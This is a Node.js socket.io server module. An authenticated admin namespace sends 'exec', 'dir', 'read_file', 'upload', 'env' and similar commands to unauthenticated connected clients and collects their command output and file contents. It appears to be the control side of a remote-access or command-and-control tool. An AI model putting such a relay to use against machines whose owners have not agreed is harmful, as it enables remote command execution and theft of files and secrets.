import jwt from "jsonwebtoken";
import { config } from "../config.js";

export const CLIENT_EVENTS = ["env", "imp", "pat", "upload", "exec", "dir", "read_file"];
export const CLIENT_REPLIES = ["exec_result", "dir_result", "file_content", "file_error"];

const sessions = new Map();

function publicSession(session) {
  return {
    socketId: session.socketId,
    username: session.username,
    client_id: session.client_id,
    connectedAt: session.connectedAt,
    lastEvent: session.lastEvent,
    replies: session.replies,
  };
}

export function listSessions() {
  return [...sessions.values()].map(publicSession);
}

export function getSession(socketId) {
  const session = sessions.get(socketId);
  return session ? publicSession(session) : null;
}

function pushReply(session, event, payload) {
  const entry = { event, payload, at: new Date().toISOString() };
  session.lastEvent = event;
  session.replies = [...session.replies.slice(-99), entry];
  return entry;
}

function logSocket(kind, socketId, extra = "") {
  console.log(`SOCKET ${kind} ${socketId}${extra ? ` ${extra}` : ""}`);
}

export function emitToClient(io, socketId, event, data) {
  if (!CLIENT_EVENTS.includes(event)) {
    const err = new Error(`Unknown event: ${event}`);
    err.status = 400;
    throw err;
  }
  const nsp = io.of("/client");
  const socket = nsp.sockets.get(socketId);
  if (!socket) return false;
  socket.emit(event, data);
  const session = sessions.get(socketId);
  if (session) session.lastEvent = `send:${event}`;
  logSocket(`/client send ${event}`, socketId);
  return true;
}

export function attachSockets(io) {
  const adminNsp = io.of("/admin");
  adminNsp.use((socket, next) => {
    const token = socket.handshake.auth?.token || socket.handshake.query?.access_token;
    if (!token) return next(new Error("Unauthorized"));
    try {
      socket.admin = jwt.verify(String(token), config.jwtSecret);
      return next();
    } catch {
      return next(new Error("Unauthorized"));
    }
  });

  adminNsp.on("connection", (socket) => {
    logSocket("/admin connected", socket.id);
    socket.emit("sockets", listSessions());
    socket.on("disconnect", () => logSocket("/admin disconnected", socket.id));
  });

  function notifyAdmins(event, payload) {
    adminNsp.emit(event, payload);
  }

  const clientNsp = io.of("/client");
  clientNsp.on("connection", (socket) => {
    const session = {
      socketId: socket.id,
      username: "",
      client_id: "",
      connectedAt: new Date().toISOString(),
      lastEvent: "connected",
      replies: [],
    };
    sessions.set(socket.id, session);
    logSocket("/client connected", socket.id);
    notifyAdmins("socket_update", { type: "connected", sockets: listSessions() });

    socket.on("client_data", (payload = {}) => {
      session.username = String(payload.username || "");
      session.client_id = payload.client_id ?? "";
      session.lastEvent = "client_data";
      logSocket(
        "/client client_data",
        socket.id,
        `username=${session.username} client_id=${session.client_id}`
      );
      notifyAdmins("socket_update", { type: "client_data", sockets: listSessions() });
    });

    for (const event of CLIENT_REPLIES) {
      socket.on(event, (payload) => {
        const entry = pushReply(session, event, payload);
        logSocket(`/client ${event}`, socket.id);
        notifyAdmins("client_reply", {
          socketId: socket.id,
          username: session.username,
          client_id: session.client_id,
          ...entry,
        });
      });
    }

    socket.on("disconnect", (reason) => {
      logSocket("/client disconnected", socket.id, reason);
      sessions.delete(socket.id);
      notifyAdmins("socket_update", {
        type: "disconnected",
        socketId: socket.id,
        sockets: listSessions(),
      });
    });
  });
}
